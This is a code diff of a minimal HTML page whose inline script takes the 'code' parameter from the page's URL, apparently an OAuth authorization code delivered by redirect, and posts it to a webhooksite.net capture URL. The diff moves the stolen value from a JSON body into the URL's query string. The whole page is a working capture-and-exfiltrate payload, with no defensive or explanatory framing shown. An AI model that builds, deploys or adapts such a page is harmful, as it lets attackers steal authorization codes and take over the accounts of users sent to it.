@@ -2,15 +2,15 @@
 <html>
 <head>
   <script>
-    const webhook = new URL("https://webhooksite.net/510a6033-bbc2-4dfc-9503-fcb2b1056fc8");
+    
     const params = new URLSearchParams(window.location.search);
-    const data = { code: params.get("code") };
+    const data = params.get("code");
+    const webhook = new URL("https://webhooksite.net/510a6033-bbc2-4dfc-9503-fcb2b1056fc8?code=");
 
-    fetch(webhook, {
+    fetch(webhook+data, {
       method: "POST",
       headers: {
-        "Content-Type": "application/json" },
-      body: JSON.stringify(data)});
+        "Content-Type": "application/json" });
   </script>
 </head>
 <body>
